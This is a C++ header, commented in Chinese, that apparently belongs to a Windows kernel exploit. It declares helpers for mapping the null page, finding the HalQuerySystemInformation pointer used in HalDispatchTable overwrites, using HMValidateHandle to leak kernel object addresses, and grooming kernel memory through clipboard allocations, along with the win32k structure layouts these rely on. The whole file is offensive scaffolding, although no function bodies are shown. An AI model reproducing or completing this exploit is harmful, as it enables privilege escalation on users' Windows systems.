#pragma once
#include <cstdio>
#include <cstdlib>
#include <Windows.h>
#include "ntapi.h"
#pragma comment(linker, "/defaultlib:ntdll.lib")

#define TYPE_WINDOW 0x1

#pragma pack(1)
typedef struct _HEAD
{
	HANDLE h;
	DWORD clockObj;
}HEAD, *PHEAD;

typedef struct _THROBJHEAD
{
	HEAD h;
	PVOID pti;
}THROBJHEAD, *PTHROBJHEAD;

typedef struct _THRDESKHEAD
{
	THROBJHEAD h;
	PVOID rpdesk;
	PVOID pSelf;
}THRDESKHEAD, *PTHRDESKHEAD;
#pragma pack()

typedef void* (__fastcall *lHMValidateHandle)(HWND h, int type);
typedef NTSTATUS(WINAPI* lpfnNtQueryIntervalProfile)(IN DWORD Src, IN OUT PDWORD Profile);

void ShowError(char *msg, DWORD dwErrorCode);			// 打印错误信息
BOOL AllocateZeroMemory();								// 在0地址申请内存
PVOID GetHalQuerySystemInformation();					// 获取保存HalQuerySystemInformation函数的位置
PVOID GetHMValidateHandle();							// 获取HMValidateHandle函数
BOOL CallNtQueryIntervalProfile();						// 调用NtQueryIntervalProfile函数
BOOL CreateClipboard(DWORD dwSize);						// 通过剪切板实现垫片操作,会产生dwSize + 0xC + 0x8的内存块